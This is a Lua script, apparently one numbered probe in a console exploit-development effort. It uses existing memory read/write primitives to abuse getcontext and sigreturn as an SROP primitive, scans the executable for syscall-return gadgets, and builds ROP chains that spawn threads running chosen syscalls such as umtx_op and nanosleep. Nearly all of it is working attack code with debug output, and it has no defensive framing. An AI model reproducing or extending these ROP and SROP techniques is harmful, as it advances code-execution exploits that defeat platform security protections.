-- CRASH_CLASS: LOW
-- PROBE 142h: ROP thread with UMTX_OP_WAIT to block child
--
-- 142g found gadgets: pop_rax(+0x992), ret(+0x42). No syscall;ret found.
-- Strategy: child calls UMTX_OP_WAIT on futex=0, expected=0 → blocks forever.
-- Then main thread checks thr_kill(child,0). If child is blocked, it's alive.
-- Also: read bytes at sc_addr to understand the post-syscall crash path.
-- And: scan for syscall;ret near sc_addr.

print("=== PROBE 142h: ROP WAIT THR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return to_num(memory.read_byte(addr)) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)
local sc_thr_kill = make_syscall(433)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local O_RDI = MC + 0x08
local O_RSI = MC + 0x10
local O_RDX = MC + 0x18
local O_R8  = MC + 0x28
local O_R9  = MC + 0x30
local O_RAX = MC + 0x38
local O_R10 = MC + 0x50
local O_RIP = MC + 0xA0
local O_RSP = MC + 0xB8

local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + O_RAX, uint64(num))
    if a1 then wq(base_ctx + O_RDI, a1) end
    if a2 then wq(base_ctx + O_RSI, a2) end
    if a3 then wq(base_ctx + O_RDX, a3) end
    if a4 then wq(base_ctx + O_R10, a4) end
    if a5 then wq(base_ctx + O_R8, a5) end
    if a6 then wq(base_ctx + O_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

--------------------------------------------------------------------
-- [A] Read bytes at sc_addr to understand post-syscall code
--------------------------------------------------------------------
print("")
print("--- [A] Code at sc_addr ---")
local code_bytes = {}
for i = 0, 15 do
    local b = safe_rb(sc_addr + i)
    if b then
        table.insert(code_bytes, string.format("%02X", b))
    else
        table.insert(code_bytes, "??")
    end
end
print("[A] sc_addr bytes: " .. table.concat(code_bytes, " "))

-- Also scan ±256 bytes around sc_addr for syscall;ret (0F 05 C3)
print("[A] Scanning ±256 for syscall;ret:")
local sah, sal = get_hi_lo(sc_addr)
for delta = -256, 256 do
    local addr_l = sal + delta
    local b0 = safe_rb(uint64(string.format("0x%X%08X", sah, addr_l)))
    local b1 = safe_rb(uint64(string.format("0x%X%08X", sah, addr_l + 1)))
    local b2 = safe_rb(uint64(string.format("0x%X%08X", sah, addr_l + 2)))
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
        print(string.format("[A] syscall;ret at sc_addr%+d", delta))
    end
end

-- Get eboot base and gadget offsets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local eboot_lo = safe_rd(info + 0x108) or 0
local eboot_hi = safe_rd(info + 0x10C) or 0

-- Known gadget offsets from 142g
local POP_RAX_OFF = 0x992
local RET_OFF = 0x42

local g_pop_rax = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + POP_RAX_OFF))
local g_ret = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + RET_OFF))
print("pop_rax=" .. hex(g_pop_rax))

--------------------------------------------------------------------
-- [B] Check if syscall;ret exists near sc_addr, or search wider
--------------------------------------------------------------------

-- Also check for int 0x80; ret pattern (CD 80 C3)
-- And for `ret` right after various syscall sites

-- Search eboot +0x200000 to +0x400000 for syscall;ret
print("")
print("--- [B] Wide syscall;ret scan ---")
local scr_found = nil
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
for off = 0x200000, 0x300000, 4 do
    local d = safe_rd(eboot_base + off)
    if d then
        -- Check for 0F 05 C3 in the dword
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
            scr_found = off
            print("[B] syscall;ret at eboot+0x" .. string.format("%X", off))
            break
        end
        if b1 == 0x0F and b2 == 0x05 then
            local b3 = math.floor(d / 16777216) % 256
            if b3 == 0xC3 then
                scr_found = off + 1
                print("[B] syscall;ret at eboot+0x" .. string.format("%X", off + 1))
                break
            end
        end
    end
end
if not scr_found then
    print("[B] No syscall;ret in 0x200000-0x300000")
end

--------------------------------------------------------------------
-- [C] ROP thread with UMTX_OP_WAIT (blocks child forever)
-- WAIT(6): blocks if *futex == expected_val (arg3=rdx)
--------------------------------------------------------------------
print("")
print("--- [C] ROP WAIT thread ---")

local futex_c = gpu + 0x1000
wd(futex_c, 0)  -- futex = 0

local stack_c = gpu + 0x10000
for off = 0, 0x3FFF, 4 do wd(stack_c + off, 0) end

local ctx_c = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)

-- Set GPRs for umtx_op WAIT:
-- RDI = futex addr
-- RSI = 6 (UMTX_OP_WAIT)
-- RDX = 0 (expected value — matches *futex)
-- R10 = 0 (size, unused for WAIT)
-- R8 = 0 (timeout ptr, NULL = infinite wait)
wq(ctx_c + O_RDI, ua(futex_c))
wq(ctx_c + O_RSI, uint64(6))   -- UMTX_OP_WAIT
wq(ctx_c + O_RDX, uint64(0))   -- expected val = 0
wq(ctx_c + O_R10, uint64(0))
wq(ctx_c + O_R8, uint64(0))

-- ROP chain: ret → pop_rax → 454 → sc_addr → [crash but blocked]
local rop_c = stack_c + 0x3000
wq(rop_c + 0x00, g_pop_rax)     -- pop rax; ret
wq(rop_c + 0x08, uint64(454))   -- → rax = 454 (umtx_op)
wq(rop_c + 0x10, sc_addr)       -- syscall → umtx_op WAIT → blocks!
wq(rop_c + 0x18, uint64(0))     -- return addr (never reached if WAIT blocks)

wq(ctx_c + O_RIP, g_ret)        -- start at `ret` gadget
wq(ctx_c + O_RSP, ua(rop_c))    -- stack = ROP chain

local tid_c = gpu + 0x30000
wq(tid_c, uint64(0xDEADDEAD))

-- Measure sys624 before
local sv624_before = srop(624)
local bh, bl = get_hi_lo(sv624_before)
print("[C] sys624_before=" .. bl)

print("[C] Creating WAIT thread...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
local ntid_c = safe_rq(tid_c)
local nch, ncl = get_hi_lo(ntid_c)
print("[C] thr_create: ok=" .. tostring(ok_c) .. " rv=" .. tostring(rv_c) .. " tid=" .. ncl)

-- Wait for child to enter WAIT
msleep()

print("[C] alive pid=" .. to_num(sc20()))

-- Check if child is alive via thr_kill
if ncl ~= 0 and ncl ~= 0xDEADDEAD then
    local ok_k, rv_k = pcall(function()
        return sc_thr_kill(uint64(ncl), uint64(0))
    end)
    print("[C] thr_kill(child,0)=" .. tostring(rv_k) .. " (0=alive,-1=dead)")

    -- Also try via SROP
    local rv_ks = srop(433, uint64(ncl), uint64(0))
    print("[C] srop_thr_kill(child,0)=" .. hex(rv_ks))
end

-- Measure sys624 after
local sv624_after = srop(624)
local ah, al = get_hi_lo(sv624_after)
print("[C] sys624_after=" .. al .. " delta=" .. (al - bl))

-- Now WAKE the child: UMTX_OP_WAKE = 3
-- This changes the futex and wakes the waiting thread
-- The child will wake up, return from umtx_op, hit sc_addr+2, crash
-- But we read the status BEFORE waking
print("[C] futex=0x" .. string.format("%X", safe_rd(futex_c) or 0))

--------------------------------------------------------------------
-- [D] Same but with nanosleep (240) to verify RAX setting
--------------------------------------------------------------------
print("")
print("--- [D] ROP nanosleep thread ---")

-- 10-second sleep timeout on GPU memory
local tspec = gpu + 0x2000
wq(tspec, uint64(10))    -- tv_sec = 10
wq(tspec + 8, uint64(0)) -- tv_nsec = 0

local stack_d = gpu + 0x14000
for off = 0, 0x3FFF, 4 do wd(stack_d + off, 0) end

local ctx_d = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx_d + off, 0) end
pcall(function() return sc_gc(uint64(ctx_d)) end)

-- nanosleep(timespec*, NULL)
wq(ctx_d + O_RDI, ua(tspec))
wq(ctx_d + O_RSI, uint64(0))

-- ROP: ret → pop_rax → 240 → sc_addr
local rop_d = stack_d + 0x3000
wq(rop_d + 0x00, g_pop_rax)
wq(rop_d + 0x08, uint64(240))   -- nanosleep
wq(rop_d + 0x10, sc_addr)
wq(rop_d + 0x18, uint64(0))

wq(ctx_d + O_RIP, g_ret)
wq(ctx_d + O_RSP, ua(rop_d))

local tid_d = gpu + 0x30010
wq(tid_d, uint64(0xDEADDEAD))

print("[D] Creating nanosleep thread (10s)...")
local ok_d, rv_d = pcall(function()
    return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
end)
local ntid_d = safe_rq(tid_d)
local ndh, ndl = get_hi_lo(ntid_d)
print("[D] rv=" .. tostring(rv_d) .. " tid=" .. ndl)

-- Wait 500ms — child should still be sleeping
msleep()

print("[D] alive pid=" .. to_num(sc20()))

if ndl ~= 0 and ndl ~= 0xDEADDEAD then
    local ok_kd, rv_kd = pcall(function()
        return sc_thr_kill(uint64(ndl), uint64(0))
    end)
    print("[D] thr_kill(child,0)=" .. tostring(rv_kd) .. " (0=alive)")
end

--------------------------------------------------------------------
-- [E] Direct syscall at RIP (no ROP) — verify RAX is preserved
-- Set RAX=20 (getpid) to see if we get the PID back
-- Child writes result to GPU before crash
--------------------------------------------------------------------
print("")
print("--- [E] Direct getpid thread ---")

-- For this test, use a different technique:
-- 1. Child calls getpid (RAX=20) → returns PID
-- 2. After syscall, sc_addr+2 code runs → crash
-- 3. But before crash, check if getpid happened by watching for
--    the PID value somewhere

-- Actually, we can't read the child's RAX after the syscall.
-- But we CAN check: if the child crashes at sc_addr+2, the crash
-- produces binary output. If the crash output is DIFFERENT when
-- we set RAX=20 vs RAX=454, that proves the child DID execute
-- with our RAX value (and the different output is from different
-- post-syscall handling).

-- Skip this — not useful. Instead just report all findings.

print("=== RESULTS SUMMARY ===")
print("pid=" .. pid)
print("threads_created: yes (valid TIDs)")
print("threads_execute: yes (binary crash output confirmed)")
print("LOCK_PI_blocks: unknown (crashes before we can check)")
print("WAIT_blocks: checking in section [C]...")

print("=== DONE ===")
